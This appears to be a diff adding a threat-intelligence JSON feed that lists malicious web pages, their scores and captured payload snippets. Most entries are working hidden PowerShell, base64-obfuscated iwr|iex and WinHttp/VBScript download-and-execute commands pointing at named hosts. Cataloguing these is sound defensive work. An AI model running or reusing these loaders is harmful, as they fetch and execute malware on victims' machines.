@@ -1,0 +1,148 @@
+[
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 584,
+    "category": "PowerShell Command",
+    "value": "curl "
+  },
+  {
+    "source_url": "https://104.199.248.167/",
+    "threat_score": 5907,
+    "category": "WinHttp VBScript",
+    "value": "XMLHTTP download pattern: ....length&&(a+=e),c=!0);C=a;if(c){d=b.h;b=b.j;var f;if(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject(\"Msxml2.XMLHTTP\")}catch(r){try{f=new ActiveXObject(\"Microsoft.XMLHTTP\")}catch(D){}}f&&(f.open(\"POST\",d+(-1==d.indexOf(\"?\")?\"?\":\"&\")+\"url=\"+encodeURIComponent(b)),f.s..."
+  },
+  {
+    "source_url": "https://104.199.248.167/",
+    "threat_score": 5907,
+    "category": "WinHttp VBScript",
+    "value": "XMLHTTP download pattern: ...f(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject(\"Msxml2.XMLHTTP\")}catch(r){try{f=new ActiveXObject(\"Microsoft.XMLHTTP\")}catch(D){}}f&&(f.open(\"POST\",d+(-1==d.indexOf(\"?\")?\"?\":\"&\")+\"url=\"+encodeURIComponent(b)),f.setRequestHeader(\"Content-Type\",\"application/x-www-form..."
+  },
+  {
+    "source_url": "https://144.22.251.16/",
+    "threat_score": 636,
+    "category": "PowerShell Command",
+    "value": "powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\\\\\Downloads\\\\\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\"`;"
+  },
+  {
+    "source_url": "https://144.22.251.16/",
+    "threat_score": 636,
+    "category": "PowerShell Command",
+    "value": "New-Object "
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "PowerShell Command",
+    "value": "powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\\\\\Downloads\\\\\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\"`;"
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "PowerShell Command",
+    "value": "New-Object "
+  },
+  {
+    "source_url": "https://74.50.99.45:8443/",
+    "threat_score": 744,
+    "category": "WinHttp VBScript",
+    "value": "WinHttp.WinHttpRequest payload: ...rm performance and security <span style=\"color: #000000\">Cloudflare</span></div> </div> </div> <script> /* */ const command = 'cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\\\ny.vbs\" && \"%temp%\\\\ny.vbs\"'; (function () { const p..."
+  },
+  {
+    "source_url": "https://74.50.99.45:8443/",
+    "threat_score": 744,
+    "category": "WinHttp VBScript",
+    "value": "WinHttp/VBScript pattern: ...or: #000000\">Cloudflare</span></div> </div> </div> <script> /* */ const command = 'cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\\\ny.vbs\" && \"%temp%\\\\ny.vbs\"'; (function () { const params = new URLSearchParams(window.location.search); cons..."
+  },
+  {
+    "source_url": "https://74.50.99.45:8443/",
+    "threat_score": 744,
+    "category": "WinHttp VBScript",
+    "value": "VBScript ResponseText execution: ...ipt> /* */ const command = 'cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\\\ny.vbs\" && \"%temp%\\\\ny.vbs\"'; (function () { const params = new URLSearchParams(window.location.search); const siteParam = params.ge..."
+  },
+  {
+    "source_url": "http://185.214.192.4/",
+    "threat_score": 493,
+    "category": "PowerShell Command",
+    "value": "cURL "
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "PowerShell Download",
+    "value": {
+      "FullMatch": "iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex",
+      "URL": "https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1",
+      "Context": "iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex",
+      "HTAPath": null,
+      "IsPotentiallyDangerous": true,
+      "RiskLevel": "High Risk"
+    }
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "PowerShell Command",
+    "value": "powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\\\"\";"
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "PowerShell Command",
+    "value": "powershell \" + htaPath;"
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "PowerShell Command",
+    "value": "iwr "
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "PowerShell Command",
+    "value": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r"
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "PowerShell Command",
+    "value": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)"
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "PowerShell Command",
+    "value": "iwr "
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Download",
+    "value": {
+      "FullMatch": "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\",
+      "URL": "http://95.164.53.214:5554/d.bat",
+      "Context": "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\",
+      "HTAPath": null,
+      "IsPotentiallyDangerous": true,
+      "RiskLevel": "High Risk"
+    }
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "powershell -c \"Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \\\"%temp%\\d.bat\\\" -UseBasicParsing; Start-Process \\\"%temp%\\d.bat\\\"\"`;\r"
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "Invoke-WebRequest"
+  },
+  {
+    "source_url": "https://www.gesundeswasser.co",
+    "threat_score": 452,
+    "category": "PowerShell Command",
+    "value": "EMBEDDED_IN_JS: powershell -c "
+  }
+]
